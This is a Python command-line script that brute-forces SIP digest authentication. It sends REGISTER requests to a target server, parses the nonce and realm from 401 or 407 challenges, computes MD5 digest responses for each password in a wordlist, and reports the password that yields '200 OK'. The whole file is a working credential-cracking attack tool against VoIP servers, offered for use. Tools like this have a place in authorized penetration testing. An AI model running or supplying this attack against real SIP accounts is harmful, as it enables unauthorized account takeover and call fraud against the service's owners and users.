#!/usr/bin/env python3

import sys
import os, subprocess
import argparse
import socket 
import time
import random
import string
import re
from hashlib import md5


parser = argparse.ArgumentParser(
    description="SIP digest password brute force tool"
)

parser.add_argument(
    '--proto',
    dest="PROTOCOL",
    type=str,
    default="udp",
    help="TCP or UDP <tcp> <udp>. Default is UDP"
)

parser.add_argument(
    '--dport',
    dest="DPORT",
    type=int,
    default=5060,
    help="Destination port. Default is 5060"
)

parser.add_argument(
    '--dst',
    dest="DST",
    type=str,
    required=True,
    help="Destination IP address"
)

parser.add_argument(
    '--file',
    dest="FILE",
    type=str,
    default="register.txt",
    help="The register message to request a nonce. Default is \"register.txt\""
)

parser.add_argument(
    '--file2',
    dest="FILE2",
    type=str,
    default="register_auth.txt",
    help="The register message with authentication header. Default is \"register_auth.txt\""
)

parser.add_argument(
    '--wordlist',
    dest="WORDLIST",
    type=str,
    default="passwords/1-999999.txt",
    help="The word list for password brute force. Default is \"passwords/1-999999.txt\""
)

parser.add_argument(
    '--src',
    dest="SRC",
    type=str,
    required=True,
    help="Source IP address"
)

parser.add_argument(
    '--domain',
    dest="DOMAIN",
    type=str,
    required=True,
    help="The SIP domain"
)

parser.add_argument(
    '--user',
    dest="USER",
    type=str,
    required=True,
    help="The username for password brute force"
)

args = parser.parse_args()



def get_register():

    f=open(args.FILE, "r", newline="")
    if f.mode == "r":
        payload = f.read()

        return(payload)

    else:
        sys.exit(1)


def get_register_auth():

    f=open(args.FILE2, "r", newline="")
    if f.mode == "r":
        payload = f.read()

        return(payload)

    else:
        sys.exit(1)



def replace_payload(payload):
    
    payload = payload.replace("DOMAIN", args.DOMAIN)
    payload = payload.replace("SRC", args.SRC)
    payload = payload.replace("USER", args.USER)

    if args.PROTOCOL == "tcp":
        payload = payload.replace("PROTO", "TCP")
    else:
        payload = payload.replace("PROTO", "UDP")

    return(payload) 



def calc_auth(response, password, callid, branch):

    nonce = re.search(b'nonce="(.+?)",', response).group(1)
    nonce = nonce.decode("utf-8")

    realm = re.search(b'realm="(.+?)",', response).group(1)
    realm = realm.decode("utf-8")
    
    uri = ("sip:" + str(realm))
    
    str1 = md5("{}:{}:{}".format(args.USER,realm,password).encode('utf-8')).hexdigest()
    str2 = md5("{}:{}".format('REGISTER',uri).encode('utf-8')).hexdigest()
    str3 = md5("{}:{}:{}".format(str1,nonce,str2).encode('utf-8')).hexdigest()

    register_auth = get_register_auth()
    register_auth = replace_payload(register_auth)
    register_auth = register_auth.replace("CALLID", callid)
    register_auth = register_auth.replace("BRANCH", branch)
    register_auth = register_auth.replace("REALM", realm)
    register_auth = register_auth.replace("NONCE", nonce)
    register_auth = register_auth.replace("URI", uri)
    register_auth = register_auth.replace("RESPONSE", str3)

    return(register_auth)

 



def main():

    req = get_register()
    req = replace_payload(req)

    lines = [line.rstrip('\n') for line in open(args.WORDLIST)]

    i = 0

    while i < len(lines):
        try:
            output=int(round((int(i)/int(len(lines)))*int(100)))
            print("\033[1;34m[*]\033[0m Progress: " + str(output) + "%", end="\r")

            callid = ( ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(32)))
            branch = ( ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(10)))

            req = req.replace("CALLID", callid)
            req = req.replace("BRANCH", branch)

            if args.PROTOCOL == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            try:
                sock.settimeout(2.0)
                sock.connect((args.DST, args.DPORT))
                sock.send(req.encode())
                response = sock.recv(1024)

                if bytes('100 Trying', 'utf-8') in response:
                   response = sock.recv(1024)

                if bytes('401 Unauthorized', 'utf-8') in response:
                    print("\033[1;34m[*]\033[0m Nonce recived\r\n")
                    auth = calc_auth(response, lines[i], callid, branch)
                    sock.send(auth.encode())
                    response = sock.recv(1024)
                    if bytes('200 OK', 'utf-8') in response: 
                        print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")

                elif bytes('407 Proxy Authentication Required', 'utf-8') in response: 
                    print("\033[1;34m[+]\033[0m Nonce recived\r\n")
                    auth = calc_auth(response, lines[i], callid, branch)
                    sock.send(auth.encode())
                    response = sock.recv(1024)
                    if bytes('200 OK', 'utf-8') in response: 
                        print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")

                elif bytes('200 OK', 'utf-8') in response: 
                    print("\033[1;32m[+]\033[0m Registred! Password is: " + lines[i] + "\r\n")



                sock.close()
                i += 1

            except (KeyboardInterrupt):
                print("\033[1;34m[*]\033[0m User interruption. Exiting ...")
                sys.exit(0)
            
            except:
                i += 1
                sock.close()

        except (KeyboardInterrupt):
            print("\033[1;34m[*]\033[0m User interruption. Exiting ...")
            sys.exit(0)



if __name__ == "__main__":
    main()



